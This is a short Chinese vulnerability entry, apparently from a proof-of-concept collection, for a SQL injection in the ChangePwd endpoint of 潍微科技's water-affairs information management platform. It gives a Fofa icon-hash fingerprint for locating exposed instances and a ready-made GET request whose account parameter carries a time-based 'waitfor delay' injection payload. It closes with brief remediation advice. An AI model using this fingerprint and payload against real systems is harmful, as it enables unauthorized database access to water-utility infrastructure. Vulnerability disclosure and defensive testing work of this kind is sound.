# 潍微科技-水务信息管理平台ChangePwdSQL注入

潍微科技-水务信息管理平台ChangePwd ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-491165370"`
- **请求**：`GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:5%27--+ HTTP/1.1`

**Payload**
```
1. Fofa
icon_hash="-491165370"
2、隐患url,复现如下
Host: your-ip
```
- **其他**：修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。